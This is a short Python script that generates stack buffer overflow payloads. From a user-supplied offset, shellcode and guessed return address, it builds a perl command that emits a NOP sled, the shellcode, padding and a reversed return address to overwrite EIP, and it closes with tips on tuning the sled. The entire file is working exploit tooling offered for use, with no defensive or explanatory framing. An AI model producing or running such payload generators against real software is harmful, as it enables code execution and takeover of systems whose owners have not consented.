#!/bin/env python3

import sys

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: " + sys.argv[0] + " offset shellcode return")
        print()
        print("offset    the number of bytes that caused the segfault")
        print("shellcode    the shellcode to run")
        print("return     the guessed return address to override eip")
        exit(1)
     
    segfault_size = str(sys.argv[1])
    shellcode = str(sys.argv[2])
    return_address = str(sys.argv[3])
    
    shellcode_len = len(shellcode[1:].split("\\x"))
    if shellcode_len < 2:
        print("Bad shellcode")
        exit(2)
    
    return_address = return_address.replace("0x","")
    
    # last 4 bytes of the number provided will be the return address
    nop_sled_size = int(segfault_size) - shellcode_len - 4
    
    # stack is as follows
    # data (segfault_size bytes - 4)
    # padding crap (4 bytes)
    # the return address (4 bytes)
    
    
    print("Nop sled length: " + str(nop_sled_size))
    print("Shelcode length: " + str(shellcode_len))
    
    print("payload...\n")
    

    return_address = [return_address[i:i+2] for i in range(0, len(return_address), 2)]
    return_address = return_address[::-1]
    
    return_address = ["\\x" + i for i in return_address]
    
    return_address = "".join(return_address)
    
    payload_string = "\"$(perl -e 'print \"\\x90\"x" + str(nop_sled_size) \
               + " . " + "\"" + shellcode + "\"" \
               + " . \"\\xFF\"x4 . \"" + return_address + "\"')\""
    
    print(payload_string)
    
    print("\n")
    
    # Its a good idea to modify the generated payload
    # if the shellcode pushes/ pops off the stack a lot it may override instructions
    # to fix this make the nop sled smaller and pad the remaining bytes with crap.
    
